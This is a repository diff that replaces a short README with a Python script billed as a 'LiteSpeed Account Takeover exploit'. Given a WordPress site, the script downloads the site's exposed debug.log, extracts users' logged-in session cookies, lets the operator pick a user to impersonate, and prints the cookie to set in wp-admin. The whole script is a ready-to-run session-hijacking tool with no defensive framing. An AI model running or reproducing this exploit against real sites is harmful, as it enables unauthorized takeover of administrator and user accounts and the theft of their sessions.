@@ -1,2 +1,68 @@
-# Lightspeed-Trickster
-if you need to unblock stuff, come to me.
+import re
+import sys
+import requests
+import argparse
+from urllib.parse import urljoin
+
+
+def extract_latest_cookies(log_content):
+    user_cookies = {}
+
+    pattern_cookie = re.compile(r'Cookie:\s.*?wordpress_logged_in_[^=]+=(.*?)%')
+
+    for line in log_content.splitlines():
+        cookie_match = pattern_cookie.search(line)
+        if cookie_match:
+            username = cookie_match.group(1)
+            user_cookies[username] = line
+
+    return user_cookies
+
+
+def choose_user(user_cookies):
+    users = list(user_cookies.keys())
+    if not users:
+        print("No users found.")
+        sys.exit(1)
+
+    # Display user options
+    print("Select a user to impersonate:")
+    for idx, user in enumerate(users):
+        print(f"{idx + 1}. {user}")
+
+    # Get the user's choice
+    choice = int(input("Pick a number: ")) - 1
+
+    if 0 <= choice < len(users):
+        return users[choice], user_cookies[users[choice]]
+    else:
+        print("Invalid selection.")
+        sys.exit(1)
+
+
+print("--- LiteSpeed Account Takeover exploit ---")
+print("       (unauthorized account access)")
+print("\t\t\tby Gonzales")
+
+parser = argparse.ArgumentParser()
+parser.add_argument('url', help='http://wphost')
+
+if len(sys.argv) == 1:
+    parser.print_help()
+    sys.exit(1)
+
+args = parser.parse_args()
+
+log_file_url = urljoin(args.url, 'wp-content/debug.log')
+
+response = requests.get(log_file_url)
+if response.status_code == 200:
+    log_content = response.text
+    ucookies = extract_latest_cookies(log_content)
+    choice, cookie = choose_user(ucookies)
+    print(f"Go to {args.url}/wp-admin/ and set this cookie:")
+    print(cookie.split(']')[1])
+else:
+    print("Log file not found.")
+    sys.exit(1)
+
